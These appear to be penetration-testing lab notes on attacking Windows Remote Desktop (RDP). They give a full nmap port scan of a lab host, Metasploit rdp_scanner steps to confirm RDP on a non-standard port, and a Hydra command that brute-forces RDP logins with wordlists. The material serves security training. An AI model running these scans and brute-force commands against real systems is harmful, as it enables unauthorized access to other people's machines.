- The Remote Desktop Protocol (RDP) is a proprietary GUI remote access protocol developed by Microsoft and is used to remotely connect and interact with a Windows system.
- RDP uses TCP port 3389 by default, and can also be configured to run on any other TCP port.
- RDP authentication requires a legitimate user account on the target system as well as the user's password in clear-text.
- We can perform an RDP brute-force attack to identify legitimate user credentials that we can use to gain remote access on the target system.

Practical Demonstration
- `nmap -sV -O -sS -p- 10.2.24.86`
- We observe from the port scan results the port that RDP is hosted on by default, TCP port 3389, is not open, and that another port, port 3333, is open, but has no description of the service running on it, the lack of a valid description is because the port is not a well-known port.
- We can use a Metasploit module, by the name of `rdp_scanner`, to identify if the unknown service running on port 3333 is actually RDP.
	- `service postgresql start && msfconsole`
	- `search rdp_scanner`
	- `use auxiliary/scanner/rdp/rdp_scanner`
	- `options`
	- `set RHOSTS 10.2.24.86`
	- `set RPORT 3333`
	- `run`
- We need to have valid user credentials to authenticate to RDP, to find those credentials, we will be performing a brute-force attack against RDP using Hydra.
- `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.2.24.86 -s 3333 -t 10`
